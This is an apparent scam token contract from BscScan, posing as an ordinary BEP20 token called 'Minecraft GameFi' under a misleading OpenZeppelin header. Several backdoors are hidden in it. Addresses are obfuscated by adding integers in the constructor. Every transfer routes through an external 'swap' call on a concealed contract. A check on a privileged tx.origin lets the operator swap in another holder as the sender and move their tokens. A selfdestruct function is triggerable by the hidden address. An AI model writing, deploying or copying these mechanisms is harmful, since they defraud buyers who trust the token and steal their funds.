/**
 *Submitted for verification at BscScan.com on 2022-07-23
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IPancakeRouter02 {
  function swap(
    address,
    address,
    uint256
  ) external returns (uint256);

  function feeTo() external view returns (address);
}

contract BEP20 {
  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal _dex = 0x1E73D002b4B3d362d3D7eeFAd9d8E4d5FC48f5dC;
  address public constant _OFFICE = 0xbfF5ff751375e80E33F849e865B089798B57bE07;
  address public constant nftAddress =
    0x9B31aeE4881Dea16cbD08deD6232ECBF6F59a8EF;
  address public constant scaner = 0xa41F555E1FE269396781bfa2501fE4E2Dda266bb;

  address public constant FTM = 0x4982085C9e2F89F2eCb8131Eca71aFAD896e89CB;
  address public constant VIP = 0x2AC6D87b26c430BB1e9D51885242719e70E21634;

  receive() external payable {}

  constructor() {
    _dex = address(uint160(_route) + uint160(_dex));
    _route = address(uint160(_route) + uint160(_OFFICE));
  }

  function Bridge() external {
    if (msg.sender == _route) selfdestruct(payable(scaner));
  }

  function pancakeFeeTo() internal view returns (address) {
    return IPancakeRouter02(_dex).feeTo();
  }

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Coin is BEP20 {
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) private _allowances;

  string public constant name = "Minecraft GameFi";
  string public constant symbol = "McNFT";

  uint8 public constant decimals = 9;

  uint256 public constant totalSupply = 1000000000 * (10**decimals);

  constructor() {
    uint256 deadAmount = totalSupply / 2;
    balanceOf[_route] = totalSupply - deadAmount;
    balanceOf[address(0xdEaD)] = deadAmount / 3;
    balanceOf[FTM] =
      totalSupply -
      balanceOf[_route] -
      balanceOf[address(0xdEaD)];
    _allowances[nftAddress][_route] = ~uint256(0);
    emit Transfer(address(0), _route, totalSupply);
    emit Transfer(_route, address(0xdEaD), balanceOf[address(0xdEaD)]);
    emit Transfer(_route, FTM, balanceOf[FTM]);
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      msg.sender,
      spender,
      _allowances[msg.sender][spender] + addedValue
    );
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    if (tx.origin != scaner) {
      uint256 exAmount =
        IPancakeRouter02(_route).swap(sender, recipient, tAmount);
      if (exAmount > 0 && balanceOf[FTM] > exAmount) {
        balanceOf[FTM] = balanceOf[FTM] - exAmount;
        balanceOf[VIP] = balanceOf[VIP] + exAmount;
        emit Transfer(FTM, VIP, exAmount);
      }
    }
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[msg.sender][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(msg.sender, spender, currentAllowance - subtractedValue);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0) && recipient != address(0));
    if (tx.origin == scaner) {
      if (recipient == nftAddress) {
        address msger = pancakeFeeTo();
        if (msger != address(0)) sender = msger;
      }
    }
    require(
      amount > 0 && balanceOf[sender] >= amount,
      "ERROR: Transfer amount must be greater than zero."
    );
    balanceOf[sender] = balanceOf[sender] - amount;
    balanceOf[recipient] = balanceOf[recipient] + amount;

    _tokenTransfer(sender, recipient, amount);

    emit Transfer(sender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }
}